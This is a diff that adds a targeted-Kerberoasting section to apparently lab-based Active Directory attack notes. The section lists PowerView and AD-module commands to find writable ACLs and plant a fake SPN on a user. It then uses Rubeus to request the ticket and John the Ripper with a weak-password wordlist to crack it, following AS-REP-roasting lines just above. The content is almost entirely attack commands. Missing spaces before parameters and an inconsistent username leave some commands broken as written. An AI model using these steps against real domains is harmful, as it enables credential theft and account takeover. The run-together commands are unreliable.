@@ -289,6 +289,23 @@ Get-ASREPHash-UserName VPN1user-Verbose
 
 #4- Use John the Ripper
 john.exe--wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt
+
+
+#If you have (GenericWrite or GenericAll) permission you can set SPN to a user the kerberost it.
+#1- Enum the permissions
+Find-InterestingDomainAcl-ResolveGUIDs | ?{$_.IdentityReferenceName-match "RDPUsers"}
+
+#2- check if the user already has a SPN
+Get-DomainUser-Identity supportuser | select serviceprincipalname  #Using PowerView
+Get-ADUser-Identity supportuser-Properties ServicePrincipalName | select ServicePrincipalName  #Using AD module
+
+#3- Set a SPN for the user (User must be unique in the forest)
+Set-DomainObject -Identity support1user-Set @{serviceprincipalname=‘dcorp/whatever1'}  #Using PowerView
+ Set-ADUser -Identity support1user-ServicePrincipalNames @{Add=‘dcorp/whatever1'}  #Using AD module
+
+#4- Kerberoast the user and crack the hash
+Rubeus.exe kerberoast /outfile:targetedhashes.txt
+john.exe--wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
 ```
 
 
